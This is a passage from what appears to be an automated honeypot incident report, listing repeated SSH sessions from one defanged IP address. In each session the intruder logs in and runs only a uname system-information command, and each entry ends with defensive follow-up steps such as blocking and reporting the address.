| `2026-08-08 17:00:11` | `cowrie.client.version` |
| `2026-08-08 17:00:11` | `cowrie.client.kex` |
| `2026-08-08 17:00:11` | `cowrie.login.success` |
| `2026-08-08 17:00:12` | `cowrie.session.params` |
| `2026-08-08 17:00:12` | `cowrie.command.input` |
| `2026-08-08 17:00:12` | `cowrie.log.closed` |
| `2026-08-08 17:00:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91061ac8f7fd

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:00 |
| **Last Seen** | 2026-08-08 17:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:00:18` | `cowrie.session.connect` |
| `2026-08-08 17:00:18` | `cowrie.client.version` |
| `2026-08-08 17:00:18` | `cowrie.client.kex` |
| `2026-08-08 17:00:18` | `cowrie.login.success` |
| `2026-08-08 17:00:19` | `cowrie.session.params` |
| `2026-08-08 17:00:19` | `cowrie.command.input` |
| `2026-08-08 17:00:19` | `cowrie.log.closed` |
| `2026-08-08 17:00:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29d1d291df90

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:00 |
| **Last Seen** | 2026-08-08 17:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:00:24` | `cowrie.session.connect` |
| `2026-08-08 17:00:24` | `cowrie.client.version` |
| `2026-08-08 17:00:25` | `cowrie.client.kex` |
| `2026-08-08 17:00:25` | `cowrie.login.success` |
| `2026-08-08 17:00:26` | `cowrie.session.params` |
| `2026-08-08 17:00:26` | `cowrie.command.input` |
| `2026-08-08 17:00:26` | `cowrie.log.closed` |
| `2026-08-08 17:00:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba18d3cfe32c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:00 |
| **Last Seen** | 2026-08-08 17:00 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:00:31` | `cowrie.session.connect` |
| `2026-08-08 17:00:31` | `cowrie.client.version` |
| `2026-08-08 17:00:31` | `cowrie.client.kex` |
| `2026-08-08 17:00:33` | `cowrie.login.success` |
| `2026-08-08 17:00:34` | `cowrie.session.params` |
| `2026-08-08 17:00:34` | `cowrie.command.input` |
| `2026-08-08 17:00:35` | `cowrie.log.closed` |
| `2026-08-08 17:00:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68e6ef6c3e9f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:00 |
| **Last Seen** | 2026-08-08 17:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:00:38` | `cowrie.session.connect` |
| `2026-08-08 17:00:38` | `cowrie.client.version` |
| `2026-08-08 17:00:38` | `cowrie.client.kex` |
| `2026-08-08 17:00:39` | `cowrie.login.success` |
| `2026-08-08 17:00:40` | `cowrie.session.params` |
| `2026-08-08 17:00:40` | `cowrie.command.input` |
| `2026-08-08 17:00:40` | `cowrie.log.closed` |
| `2026-08-08 17:00:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d88f73e55b5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:00 |
| **Last Seen** | 2026-08-08 17:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:00:44` | `cowrie.session.connect` |
| `2026-08-08 17:00:44` | `cowrie.client.version` |
| `2026-08-08 17:00:44` | `cowrie.client.kex` |
| `2026-08-08 17:00:45` | `cowrie.login.success` |
| `2026-08-08 17:00:46` | `cowrie.session.params` |
| `2026-08-08 17:00:46` | `cowrie.command.input` |
| `2026-08-08 17:00:46` | `cowrie.log.closed` |
| `2026-08-08 17:00:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e84ad746ab0d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:00 |
| **Last Seen** | 2026-08-08 17:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:00:50` | `cowrie.session.connect` |
| `2026-08-08 17:00:51` | `cowrie.client.version` |
| `2026-08-08 17:00:51` | `cowrie.client.kex` |
| `2026-08-08 17:00:51` | `cowrie.login.success` |
| `2026-08-08 17:00:52` | `cowrie.session.params` |
| `2026-08-08 17:00:52` | `cowrie.command.input` |
| `2026-08-08 17:00:52` | `cowrie.log.closed` |
| `2026-08-08 17:00:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6295126e36fa

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:00 |
| **Last Seen** | 2026-08-08 17:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:00:57` | `cowrie.session.connect` |
| `2026-08-08 17:00:57` | `cowrie.client.version` |
| `2026-08-08 17:00:57` | `cowrie.client.kex` |
| `2026-08-08 17:00:57` | `cowrie.login.success` |
| `2026-08-08 17:00:58` | `cowrie.session.params` |
| `2026-08-08 17:00:58` | `cowrie.command.input` |
| `2026-08-08 17:00:58` | `cowrie.log.closed` |
| `2026-08-08 17:00:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a4082ad76f0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:01 |
| **Last Seen** | 2026-08-08 17:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:01:03` | `cowrie.session.connect` |
| `2026-08-08 17:01:03` | `cowrie.client.version` |
| `2026-08-08 17:01:03` | `cowrie.client.kex` |
| `2026-08-08 17:01:03` | `cowrie.login.success` |
| `2026-08-08 17:01:04` | `cowrie.session.params` |
| `2026-08-08 17:01:04` | `cowrie.command.input` |
| `2026-08-08 17:01:05` | `cowrie.log.closed` |
| `2026-08-08 17:01:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6453bca573eb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:01 |
| **Last Seen** | 2026-08-08 17:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:01:09` | `cowrie.session.connect` |
| `2026-08-08 17:01:09` | `cowrie.client.version` |
| `2026-08-08 17:01:09` | `cowrie.client.kex` |
| `2026-08-08 17:01:10` | `cowrie.login.success` |
| `2026-08-08 17:01:11` | `cowrie.session.params` |
| `2026-08-08 17:01:11` | `cowrie.command.input` |
| `2026-08-08 17:01:11` | `cowrie.log.closed` |
| `2026-08-08 17:01:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2d34c15e357

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:01 |
| **Last Seen** | 2026-08-08 17:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:01:15` | `cowrie.session.connect` |
| `2026-08-08 17:01:15` | `cowrie.client.version` |
| `2026-08-08 17:01:15` | `cowrie.client.kex` |
| `2026-08-08 17:01:16` | `cowrie.login.success` |
| `2026-08-08 17:01:17` | `cowrie.session.params` |
| `2026-08-08 17:01:17` | `cowrie.command.input` |
| `2026-08-08 17:01:17` | `cowrie.log.closed` |
| `2026-08-08 17:01:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88bf04b7cf95

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:01 |
| **Last Seen** | 2026-08-08 17:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:01:21` | `cowrie.session.connect` |
| `2026-08-08 17:01:22` | `cowrie.client.version` |
| `2026-08-08 17:01:22` | `cowrie.client.kex` |
| `2026-08-08 17:01:22` | `cowrie.login.success` |
| `2026-08-08 17:01:24` | `cowrie.session.params` |
| `2026-08-08 17:01:24` | `cowrie.command.input` |
| `2026-08-08 17:01:24` | `cowrie.log.closed` |
| `2026-08-08 17:01:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c99922f5b734

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:01 |
| **Last Seen** | 2026-08-08 17:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:01:28` | `cowrie.session.connect` |
| `2026-08-08 17:01:28` | `cowrie.client.version` |
| `2026-08-08 17:01:28` | `cowrie.client.kex` |
| `2026-08-08 17:01:29` | `cowrie.login.success` |
| `2026-08-08 17:01:30` | `cowrie.session.params` |
| `2026-08-08 17:01:30` | `cowrie.command.input` |
| `2026-08-08 17:01:30` | `cowrie.log.closed` |
| `2026-08-08 17:01:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7581919f976f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:01 |
| **Last Seen** | 2026-08-08 17:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:01:35` | `cowrie.session.connect` |
| `2026-08-08 17:01:35` | `cowrie.client.version` |
| `2026-08-08 17:01:35` | `cowrie.client.kex` |
| `2026-08-08 17:01:35` | `cowrie.login.success` |
| `2026-08-08 17:01:36` | `cowrie.session.params` |
| `2026-08-08 17:01:36` | `cowrie.command.input` |
| `2026-08-08 17:01:36` | `cowrie.log.closed` |
| `2026-08-08 17:01:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a02e015bc2a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:01 |
| **Last Seen** | 2026-08-08 17:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:01:41` | `cowrie.session.connect` |
| `2026-08-08 17:01:41` | `cowrie.client.version` |
| `2026-08-08 17:01:41` | `cowrie.client.kex` |
| `2026-08-08 17:01:42` | `cowrie.login.success` |
| `2026-08-08 17:01:43` | `cowrie.session.params` |
| `2026-08-08 17:01:43` | `cowrie.command.input` |
| `2026-08-08 17:01:43` | `cowrie.log.closed` |
| `2026-08-08 17:01:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dffa8ffe907e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:01 |
| **Last Seen** | 2026-08-08 17:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:01:47` | `cowrie.session.connect` |
| `2026-08-08 17:01:47` | `cowrie.client.version` |
| `2026-08-08 17:01:47` | `cowrie.client.kex` |
| `2026-08-08 17:01:48` | `cowrie.login.success` |
| `2026-08-08 17:01:49` | `cowrie.session.params` |
| `2026-08-08 17:01:49` | `cowrie.command.input` |
| `2026-08-08 17:01:50` | `cowrie.log.closed` |
| `2026-08-08 17:01:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c21e9e5f5d0e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:01 |
| **Last Seen** | 2026-08-08 17:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:01:54` | `cowrie.session.connect` |
| `2026-08-08 17:01:54` | `cowrie.client.version` |
| `2026-08-08 17:01:54` | `cowrie.client.kex` |
| `2026-08-08 17:01:55` | `cowrie.login.success` |
| `2026-08-08 17:01:57` | `cowrie.session.params` |
| `2026-08-08 17:01:57` | `cowrie.command.input` |
| `2026-08-08 17:01:57` | `cowrie.log.closed` |
| `2026-08-08 17:01:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-388e9fe7b5ba

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:02 |
| **Last Seen** | 2026-08-08 17:02 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:02:01` | `cowrie.session.connect` |
| `2026-08-08 17:02:01` | `cowrie.client.version` |
| `2026-08-08 17:02:01` | `cowrie.client.kex` |
| `2026-08-08 17:02:02` | `cowrie.login.success` |
| `2026-08-08 17:02:03` | `cowrie.session.params` |
| `2026-08-08 17:02:03` | `cowrie.command.input` |
| `2026-08-08 17:02:03` | `cowrie.log.closed` |
| `2026-08-08 17:02:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90c9c9506f26

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:02 |
| **Last Seen** | 2026-08-08 17:02 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:02:07` | `cowrie.session.connect` |
| `2026-08-08 17:02:07` | `cowrie.client.version` |
| `2026-08-08 17:02:07` | `cowrie.client.kex` |
| `2026-08-08 17:02:08` | `cowrie.login.success` |
| `2026-08-08 17:02:09` | `cowrie.session.params` |
| `2026-08-08 17:02:09` | `cowrie.command.input` |
| `2026-08-08 17:02:09` | `cowrie.log.closed` |
| `2026-08-08 17:02:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c27909cde7af

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:02 |
| **Last Seen** | 2026-08-08 17:02 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:02:14` | `cowrie.session.connect` |
| `2026-08-08 17:02:14` | `cowrie.client.version` |
| `2026-08-08 17:02:14` | `cowrie.client.kex` |
| `2026-08-08 17:02:15` | `cowrie.login.success` |
| `2026-08-08 17:02:16` | `cowrie.session.params` |
| `2026-08-08 17:02:16` | `cowrie.command.input` |
| `2026-08-08 17:02:16` | `cowrie.log.closed` |
| `2026-08-08 17:02:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79ed5db0d615

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:02 |
| **Last Seen** | 2026-08-08 17:02 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:02:20` | `cowrie.session.connect` |
| `2026-08-08 17:02:20` | `cowrie.client.version` |
| `2026-08-08 17:02:20` | `cowrie.client.kex` |
| `2026-08-08 17:02:21` | `cowrie.login.success` |
| `2026-08-08 17:02:22` | `cowrie.session.params` |
| `2026-08-08 17:02:22` | `cowrie.command.input` |
| `2026-08-08 17:02:22` | `cowrie.log.closed` |
| `2026-08-08 17:02:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9d285efbec4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:02 |
| **Last Seen** | 2026-08-08 17:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:02:26` | `cowrie.session.connect` |
| `2026-08-08 17:02:26` | `cowrie.client.version` |
| `2026-08-08 17:02:26` | `cowrie.client.kex` |
| `2026-08-08 17:02:27` | `cowrie.login.success` |
| `2026-08-08 17:02:28` | `cowrie.session.params` |
| `2026-08-08 17:02:28` | `cowrie.command.input` |
| `2026-08-08 17:02:28` | `cowrie.log.closed` |
| `2026-08-08 17:02:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64192bde25f1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:02 |
| **Last Seen** | 2026-08-08 17:02 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:02:32` | `cowrie.session.connect` |
| `2026-08-08 17:02:33` | `cowrie.client.version` |
| `2026-08-08 17:02:33` | `cowrie.client.kex` |
| `2026-08-08 17:02:33` | `cowrie.login.success` |
| `2026-08-08 17:02:34` | `cowrie.session.params` |
| `2026-08-08 17:02:34` | `cowrie.command.input` |
| `2026-08-08 17:02:35` | `cowrie.log.closed` |
| `2026-08-08 17:02:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8675ced4391a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:02 |
| **Last Seen** | 2026-08-08 17:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:02:39` | `cowrie.session.connect` |
| `2026-08-08 17:02:39` | `cowrie.client.version` |
| `2026-08-08 17:02:39` | `cowrie.client.kex` |
| `2026-08-08 17:02:40` | `cowrie.login.success` |
| `2026-08-08 17:02:40` | `cowrie.session.params` |
| `2026-08-08 17:02:40` | `cowrie.command.input` |
| `2026-08-08 17:02:41` | `cowrie.log.closed` |
| `2026-08-08 17:02:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-431c818fb005

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:02 |
| **Last Seen** | 2026-08-08 17:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:02:46` | `cowrie.session.connect` |
| `2026-08-08 17:02:46` | `cowrie.client.version` |
| `2026-08-08 17:02:46` | `cowrie.client.kex` |
| `2026-08-08 17:02:47` | `cowrie.login.success` |
| `2026-08-08 17:02:47` | `cowrie.session.params` |
| `2026-08-08 17:02:47` | `cowrie.command.input` |
| `2026-08-08 17:02:47` | `cowrie.log.closed` |
| `2026-08-08 17:02:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58350095e0b3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-08 17:02 |
| **Last Seen** | 2026-08-08 17:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 17:02:59` | `cowrie.session.connect` |
| `2026-08-08 17:02:59` | `cowrie.client.version` |
| `2026-08-08 17:02:59` | `cowrie.client.kex` |
| `2026-08-08 17:03:00` | `cowrie.login.success` |
| `2026-08-08 17:03:01` | `cowrie.session.params` |
| `2026-08-08 17:03:01` | `cowrie.command.input` |
| `2026-08-08 17:03:01` | `cowrie.log.closed` |
| `2026-08-08 17:03:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86bcde6eb2dc

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
